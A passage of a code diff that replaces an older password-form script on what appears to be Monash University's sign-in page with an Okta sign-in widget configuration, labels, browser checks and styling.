+        consent: hasOAuth2ConsentFeature,
+        showPasswordToggleOnSignInPage: showPasswordToggleOnSignInPage,
+        registration: registration
+      },
+
+      assets: {
+        baseUrl: okta.cdnUrlHostname + '/assets/js/mvc/loginpage/i18n'
+      },
+
+      language: okta.locale,
+      i18n: {},
+
+      customButtons: customButtons,
+
+      helpLinks: {
+        help: 'http\x3A\x2F\x2Fmonash.edu\x2Fesolutions\x2Fcontact\x2F',
+        forgotPassword: 'https\x3A\x2F\x2Fsspr.monash.edu',
+        unlock: 'https\x3A\x2F\x2Fsspr.monash.edu',
+        custom: customLinks
+      }
     }
-  
-    if (!oldPassword.value) {
-      u.setError(oldPassword, e.oldPasswordEmpty);
-      return false;
-    }
-  
-    if (!newPassword.value) {
-      u.setError(newPassword, e.newPasswordEmpty);
-      return false;
-    }
-  
-    if (!confirmNewPassword.value) {
-      u.setError(confirmNewPassword, e.confirmNewPasswordEmpty);
-      return false;
-    }
-  
-    if (newPassword.value !== confirmNewPassword.value) {
-      u.setError(confirmNewPassword, e.mismatchError);
-      return false;
-    }
-  
-    var error = document.getElementById('error');
-    error.innerHTML = '';
-    return true;
   };
-}
 
-// Add link for password reset, if we find the forms authentication element in the page
-var formsAuthArea = document.getElementById("formsAuthenticationArea");
-if (formsAuthArea)
-{
+  loginPageConfig.signIn.i18n[okta.locale] = {
+    
+    'primaryauth.username.placeholder': usernameLabel,
+    'primaryauth.username.tooltip': usernameInlineLabel,
+    'primaryauth.password.placeholder': passwordLabel,
+    'primaryauth.password.tooltip': passwordInlineLabel,
+    'primaryauth.title': signinLabel,
+    'forgotpassword': forgotpasswordLabel,
+    'unlockaccount': unlockaccountLabel,
+    'help': helpLabel,
+    'needhelp': footerHelpTitle,
+    'password.forgot.email.or.username.placeholder': recoveryFlowPlaceholder,
+    'password.forgot.email.or.username.tooltip': recoveryFlowPlaceholder,
+    'account.unlock.email.or.username.placeholder': recoveryFlowPlaceholder,
+    'account.unlock.email.or.username.tooltip': recoveryFlowPlaceholder
+  };
 
-//Create the hyperlink 
-  var pwdResetLink = document.createElement('a');
-  var linkText = document.createTextNode("Forgot your password?");
-  pwdResetLink.appendChild(linkText);
-  pwdResetLink.title = "If you have forgotten your password click here ";
-  pwdResetLink.href = "http://sspr.monash.edu/";
-  document.body.appendChild(pwdResetLink);
+  function isOldWebBrowserControl() {
+    // We no longer support IE7. If we see the MSIE 7.0 browser mode, it's a good signal
+    // that we're in a windows embedded browser.
+    if (navigator.userAgent.indexOf('MSIE 7.0') === -1) {
+      return false;
+    }
 
-//append to the authArea
-  var authArea = document.getElementById("authArea");
-  authArea.appendChild(pwdResetLink);
-}
+    // Because the userAgent is the same across embedded browsers, we use feature
+    // detection to see if we're running on older versions that do not support updating
+    // the documentMode via x-ua-compatible.
+    return document.all && !window.atob;
+  }
+
+  function isAbsoluteUri(uri) {
+    var pat = /^https?:\/\//i;
+    return pat.test(uri);
+  }
+
+  var unsupportedContainer = document.getElementById('okta-sign-in');
+
+  // Old versions of WebBrowser Controls (specifically, OneDrive) render in IE7 browser
+  // mode, with no way to override the documentMode. In this case, inform the user they need
+  // to upgrade.
+  if (isOldWebBrowserControl()) {
+    document.getElementById('unsupported-onedrive').removeAttribute('style');
+    unsupportedContainer.removeAttribute('style');
+  }
+  else if (!navigator.cookieEnabled) {
+    document.getElementById('unsupported-cookie').removeAttribute('style');
+    unsupportedContainer.removeAttribute('style');
+  }
+  else {
+    // unsupportedContainer.parentNode.removeChild(unsupportedContainer);
+    runLoginPage(function () {
+      // OktaLogin.initLoginPage(loginPageConfig);
+    });
+  }
+
+}());
+</script>
+
+<script>
+  window.addEventListener('load', function(event) {
+    function applyStyle(id, style) {
+      if (style) {
+        var el = document.getElementById(id);
+        if (el) {
+          el.setAttribute('style', style);
+        }
+      }
+    }
+    applyStyle('login-bg-image', "background-image: url('https://ok6static.oktacdn.com/bc/image/fileStoreRecord?id=fs0128q1r7cxzInIc2p7')");
+    applyStyle('login-bg-image-ie8', "filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://ok6static.oktacdn.com/bc/image/fileStoreRecord?id=fs0128q1r7cxzInIc2p7', sizingMethod='scale')");
+  });
+</script>
 
 
-//]]>
-</script>   
- </body>
-</html>
+
+<iframe data-se="account-chooser" src="https://login.okta.com/discovery/iframe.html" style="display:none"></iframe></body></html>
